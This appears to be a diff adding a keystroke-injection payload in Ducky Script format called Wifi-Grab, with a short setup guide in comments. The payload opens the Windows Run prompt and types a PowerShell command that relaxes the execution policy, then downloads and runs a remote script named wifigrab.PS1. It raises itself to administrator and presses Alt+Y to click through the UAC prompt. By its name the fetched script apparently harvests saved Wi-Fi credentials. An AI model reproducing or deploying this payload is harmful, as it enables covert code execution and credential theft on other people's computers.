@@ -1,0 +1,38 @@
+COM the powershell script and this payload can be found at
+COM https://github.com/Huzaifaahmed01/Al-Nafi-Cipher-Scripts/tree/main/Wifi-Grab
+
+COM --------GUIDE---------
+COM download the powershell script.
+COM edit and add the required data.
+COM copy and paste all the text to notepad and save as anyname.txt.
+COM upload the text to anywhere where you can get the downlaod link
+COM copy the direct download link.
+
+COM I have added this delay for a bit of pause you can decrease it to 200 and it will work fine
+DELAY 15000
+
+COM Opens the Windows Run prompt.
+GUI r
+
+COM Delays 0.2 seconds to give the Run prompt time to open.
+DELAY 200
+
+COM this command will download the text and save as d.ps1 then run
+COM if the script failed to run change the ExecPolicy to Bypass
+STRING powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget https://raw.githubusercontent.com/Huzaifaahmed01/Al-Nafi-Cipher-Scripts/main/Wifi-Grab/wifigrab.PS1 -o \d.ps1;\d.ps1
+
+COM Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
+CTRL SHIFT ENTER
+
+COM adding a delay for popup window to appear
+DELAY 1000
+
+COM 2 TABS to confirm opening of powershell
+TAB
+TAB
+
+COM Delay 0.5 seconds to give the UAC prompt time to open.
+DELAY 500
+
+COM Presses Alt + Y to bypass UAC.
+ALT y
